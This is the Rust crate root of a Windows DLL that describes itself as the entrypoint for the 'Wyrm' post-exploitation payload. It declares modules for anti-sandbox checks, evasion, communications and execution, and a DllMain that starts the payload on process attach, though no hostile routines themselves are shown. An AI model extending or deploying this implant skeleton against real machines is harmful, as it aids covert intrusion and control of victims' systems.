#![feature(string_remove_matches)]
#![feature(core_float_math)]
#![feature(const_option_ops)]
#![feature(const_trait_impl)]

use windows_sys::Win32::{Foundation::HINSTANCE, System::SystemServices::DLL_PROCESS_ATTACH};

use crate::utils::export_comptime::{StartType, internal_dll_start};

mod anti_sandbox;
mod comms;
mod entry;
mod evasion;
mod execute;
mod native;
mod utils;
mod wyrm;

/// DLLMain acts as the entrypoint for the Wyrm post exploitation payload. The DLL sets a global atomic to track the thread ID, which
/// on exit, allows the thread to
#[unsafe(no_mangle)]
#[allow(non_snake_case)]
unsafe extern "system" fn DllMain(_hmod_instance: HINSTANCE, dw_reason: u32, _: usize) -> i32 {
    match dw_reason {
        DLL_PROCESS_ATTACH => internal_dll_start(StartType::DllMain),
        _ => (),
    }

    1
}
